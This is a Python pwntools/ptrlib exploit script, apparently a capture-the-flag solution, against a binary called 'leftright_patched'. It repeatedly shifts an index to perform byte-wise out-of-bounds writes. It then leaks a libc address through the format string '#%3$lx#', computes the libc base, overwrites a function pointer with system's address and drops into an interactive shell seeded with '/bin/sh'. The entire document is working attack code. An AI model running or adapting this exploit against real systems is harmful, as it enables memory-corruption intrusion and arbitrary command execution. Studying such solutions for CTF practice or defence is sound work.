#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./leftright_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    while True:
        io = connect()

        io.sendlineafter(b"Name: ", b"/bin/sh\0")

        print("=" * (0xFF90 // 0x1000 + 1))
        for i in range(0xFF90):
            io.sendline(b"1")
            io.recvline()
            if i % 0x1000 == 0:
                sys.stdout.flush()
                print("#", end="")
        print()

        io.sendline(b"2")
        io.sendline(ptr.p8(0xB9))
        io.sendline(b"1")
        io.sendline(b"2")
        io.sendline(ptr.p8(0x51))

        for i in range(0x8 * 6 - 1):
            io.sendline(b"1")
            io.recvline()

        io.sendline(b"2")
        io.sendline(ptr.p8(0xB9))
        io.sendline(b"1")
        io.sendline(b"2")
        io.sendline(ptr.p8(0x51))

        for i in range(0x3F):
            io.sendline(b"1")
            io.recvline()

        io.sendline(b"0")

        try:
            io.sendlineafter(b"Name: ", b"#%3$lx#")
        except EOFError:
            ptr.logger.error(":(")
            continue

        print("=" * (0xFF88 // 0x1000 + 1))
        for i in range(0xFF88):
            io.sendline(b"1")
            io.recvline()
            if i % 0x1000 == 0:
                sys.stdout.flush()
                print("#", end="")
        print()

        io.sendline(b"2")
        io.sendline(ptr.p8(0x70))
        io.sendline(b"1")
        io.sendline(b"2")
        io.sendline(ptr.p8(0x07))
        io.sendline(b"1")
        io.sendline(b"2")
        io.sendline(ptr.p8(0xC6))

        io.sendline(b"3")

        try:
            io.recvuntil(b"bye#")
        except EOFError:
            ptr.logger.error(":(")
            continue
        libc.base = int(io.recvuntil(b"#").strip(b"#"), 16) - 0x114A37

        print("=" * (0xFF88 // 0x1000 + 1))
        for i in range(0xFF88):
            io.sendline(b"1")
            io.recvline()
            if i % 0x1000 == 0:
                sys.stdout.flush()
                print("#", end="")
        print()

        system = unwrap(libc.symbol("system"))
        system_bytes = ptr.p64(system)

        io.sendline(b"2")
        io.sendline(ptr.p8(system_bytes[0]))
        io.sendline(b"1")
        io.sendline(b"2")
        io.sendline(ptr.p8(system_bytes[1]))
        io.sendline(b"1")
        io.sendline(b"2")
        io.sendline(ptr.p8(system_bytes[2]))

        io.sendline(b"3")
        io.interactive()
        return


if __name__ == "__main__":
    main()
